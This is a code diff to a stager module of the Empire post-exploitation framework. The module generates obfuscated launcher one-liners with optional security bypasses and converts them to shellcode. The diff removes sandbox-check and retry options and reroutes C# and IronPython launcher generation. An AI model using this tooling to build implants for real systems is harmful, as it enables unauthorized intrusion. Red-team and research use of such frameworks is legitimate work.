@@ -1,9 +1,6 @@
-import logging
 import subprocess
 
-from empire.server.common import helpers
-
-log = logging.getLogger(__name__)
+from empire.server.core.exceptions import StagerGenerationException
 
 
 class Stager:
@@ -34,11 +31,6 @@ class Stager:
                 "SuggestedValues": ["powershell", "ironpython", "csharp"],
                 "Strict": True,
             },
-            "StagerRetries": {
-                "Description": "Times for the stager to retry connecting.",
-                "Required": False,
-                "Value": "0",
-            },
             "OutFile": {
                 "Description": "Filename that should be used for the generated output.",
                 "Required": False,
@@ -47,9 +39,7 @@ class Stager:
             "Obfuscate": {
                 "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types.",
                 "Required": False,
-                "Value": "False",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
+                "Value": False,
                 "DependsOn": [{"name": "Language", "values": ["powershell"]}],
             },
             "ObfuscateCommand": {
@@ -60,13 +50,6 @@ class Stager:
                     {"name": "Language", "values": ["powershell"]},
                     {"name": "Obfuscate", "values": ["True"]},
                 ],
-            },
-            "SafeChecks": {
-                "Description": "Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
-                "Required": True,
-                "Value": "True",
-                "SuggestedValues": ["True", "False"],
-                "Strict": True,
             },
             "UserAgent": {
                 "Description": "User-agent string to use for the staging request (default, none, or other).",
@@ -87,6 +70,7 @@ class Stager:
                 "Description": "Bypasses as a space separated list to be prepended to the launcher",
                 "Required": False,
                 "Value": "",
+                "BypassLanguage": "powershell",
             },
             "Arch": {
                 "Description": "Architecture of the .dll to generate (x64 or x86).",
@@ -113,35 +97,21 @@ class Stager:
         user_agent = self.options["UserAgent"]["Value"]
         proxy = self.options["Proxy"]["Value"]
         proxy_creds = self.options["ProxyCreds"]["Value"]
-        stager_retries = self.options["StagerRetries"]["Value"]
-        safe_checks = self.options["SafeChecks"]["Value"]
         arch = self.options["Arch"]["Value"]
         msf_format = self.options["MSF_Format"]["Value"]
 
         encode = True
 
-        invoke_obfuscation = False
-        if obfuscate.lower() == "true":
-            invoke_obfuscation = True
+        invoke_obfuscation = obfuscate
 
         if language in ["csharp", "ironpython"]:
-            if (
-                self.main_menu.listenersv2.get_active_listener_by_name(
-                    listener_name
-                ).info["Name"]
-                != "HTTP[S]"
-            ):
-                log.error(
-                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
-                )
-                return ""
-
-            self.launcher = self.main_menu.stagergenv2.generate_exe_oneliner(
+            self.launcher = self.main_menu.stagergenv2.generate_exe_oneliner_routed(
                 language=language,
                 obfuscate=invoke_obfuscation,
                 obfuscation_command=obfuscate_command,
                 encode=encode,
                 listener_name=listener_name,
+                bypasses=self.options["Bypasses"]["Value"],
             )
 
         elif language == "powershell":
@@ -154,14 +124,11 @@ class Stager:
                 user_agent=user_agent,
                 proxy=proxy,
                 proxy_creds=proxy_creds,
-                stager_retries=stager_retries,
-                safe_checks=safe_checks,
                 bypasses=self.options["Bypasses"]["Value"],
             )
 
-        if self.launcher == "":
-            print(helpers.color("[!] Error in launcher command generation."))
-            return ""
+        if not self.launcher:
+            raise StagerGenerationException("Error in launcher command generation.")
 
         return self.generate_shellcode(msf_format, arch, self.launcher)
 
